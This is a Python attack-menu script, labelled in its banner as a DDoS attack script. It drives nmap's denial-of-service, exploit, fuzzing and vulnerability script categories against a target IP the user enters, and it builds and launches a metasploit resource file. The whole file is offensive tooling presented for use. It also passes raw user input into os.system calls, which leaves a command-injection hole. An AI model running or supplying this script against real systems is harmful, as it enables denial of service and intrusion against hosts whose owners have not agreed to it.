#coding=utf-8
import os
import time

title = '''
      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                    
 DDos python script | Script used for testing ddos | Ddos attack     
'''
print('_!_!_!_!_!_!_!_!_!_!_!_!_!_')
print(    '!_!_!_!_!_!_!_!_!_!_!_!_!_!')
print(    '   ！——！——！——！')
print(        '!！——！——！')
print('1.進行一系列腳本掃描')
print('2.進行DDOS')
print('3.使用nmap 利用已知的漏洞入侵系統')
print('4.使用nmap 探測目的機是否感染了病毒、開啟了後門等資訊')
print('5.使用nmap 對系統進行安全檢查')
print('6.更新nmap腳本資料庫')
print('7.使用nmap檢測MS-17-010')
print('8.生成metasploit自動攻擊模組要用的rc')
print('9.安裝nmap高級漏洞掃描模組')
print('10.調用高級漏洞掃描模組')
print('11.自己寫的web資訊收集器')
print('12.使用metasploit自動攻擊模組')
gs=input('請輸入你要執行的步驟:')
def nmap():
    try:
      g=input('目標IP:')
      print('[+]一般枚舉')
      nmap1=os.system('nmap -vv -Pn -sC -sS -T4 -p {}'.format(g))
      print(nmap1)
      print('====================================================')
      nmap2=os.system('nmap -v -sS -A -T4 {}'.format(g))
      print(nmap2)
      print('====================================================')
      print('[*]Verbose，SYN Stealth，版本資訊和針對服務的腳本。')
      nmap3=os.system('nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 {}'.format(g))
      print(nmap3)
      print('====================================================')
      print('[*]進行資訊挖掘')
      nmap4=os.system('nmap -sS --script discovery {}'.format(g))
      print(nmap4)
      print('====================================================')
      print('[*]進行利用協力廠商的資料庫或資源進行資訊收集或者攻擊')
      nmap5=os.system('nmap -sS --script external {}'.format(g))
      print(nmap5)
      print('====================================================')
      print('[*]進行模糊測試，發送異常的包到目的機，探測出潛在漏洞 ')
      nmap6=os.system('nmap -sS --script fuzzer {}'.format(g))
      print(nmap6)
      print('====================================================')
      print('[*]對目的機進行檢查是否存在常見的漏洞')
      nmap7=os.system('nmap -sS --script vuln {}'.format(g))
      print(nmap7)
    except:
        print('[-]出現了錯誤')
        exit()

def ddos():
    try:
      print('[*]進行拒絕服務攻擊')
      g1=input('請輸入目標IP:')
      nmap8=os.system('nmap --script dos {}'.format(g1))
      print(nmap8)
    except:
        print('[-]出現了錯誤')
        exit()
def exploit():
    try:
      print('[*]利用已知的漏洞入侵系統')
      g2=input('請輸入目標IP:')
      nmap9=os.system('nmap --script exploit {}'.format(g2))
      print(nmap9)
    except:
        print('[-]出現了錯誤')
        exit()
def malware():
    try:
      print('[*]探測目的機是否感染了病毒、開啟了後門等資訊')
      g3=input('請輸入目標IP:')
      nmap10=os.system('nmap --script malware {}'.format(g3))
      print(nmap10)
    except:
        print('[-]出現了錯誤')
        exit()
def safe():
    try:
        print('[*]檢測系統安全問題')
        g4=input('請輸入目標IP:')
        nmap11=os.system('nmap --script safe {}'.format(g4))
        print(nmap11)
    except:
        print('[-]出現了錯誤')
        exit()
def update():
    try:
      print('[*]更新腳本資料庫')
      nmap12=os.system('nmap --script-update')
      print(nmap12)
    except:
        print('[-]出現了錯誤')
        exit()
def ms17010():
    try:
      print('[*]掃描MS17010的腳本')
      g5=input('請輸入目標IP:')
      nmap13=os.system('nmap --script smb-vuln-ms17-010 {}'.format(g5))
      print(nmap13)
    except:
        print('[-]出現了錯誤')
        exit()
def scanner():
    try:
        lid=input('請輸入目標IP:')
        xc=input('請輸入執行緒(最大不能超過10):')
        file=open('zdgj.rc','w')
        file.write('use auxiliary/scanner/portscan/tcp'+"\n")
        file.write('set RHOSTS {}'.format(lid)+"\n")
        file.write('set THREADS {}'.format(xc)+"\n")
        file.write('run'+"\n")
    except:
        print('[-]出現了錯誤')
        exit()
def gjls():
    try:
      print('[*]nmap安裝高級漏洞掃描')
      print('[*]通過其程式Github或官網壓縮包下載，解壓後把其中的檔釋放到以下Nmap資料夾內')
      print('[*]詳細教程:http://www.tiaozhanziwo.com/archives/781.html')
      print('[*]詳細教程2:http://www.52bug.cn/hacktool/3661.html')
      nmap14=os.system('git clone github：https://github.com/scipag/vulscan')
      print(nmap14)
    except:
        print('[-]出現了錯誤，請確認你安裝了git')
def gjldsm():
    try:
      print('[*]執行高級漏洞掃描模組前請確認你安裝了該模組')
      gs6=input('請輸入目標IP:')
      nmap15=os.system('nmap -sS -sV --script=vulscan {}'.format(gs6))
      print(nmap15)
    except:
        print('[-]出現了錯誤')
        exit()
def chax():
    print('[*]調用chaxw.py')
    import chaxw
def msf():
    metasploit = os.system('msfconsole -r /root/zdgj.rc')
    print(metasploit)
if gs=='1':
  nmap()
elif gs=='2':
    ddos()
elif gs=='3':
    exploit()
elif gs=='4':
    malware()
elif gs=='5':
  safe()
elif gs=='6':
  update()
elif gs=='7':
    ms17010()
elif gs=='8':
  scanner()
elif gs=='9':
    gjls()
elif gs=='10':
    gjldsm()
elif gs=='11':
    chax()
elif gs=='12':
    msf()
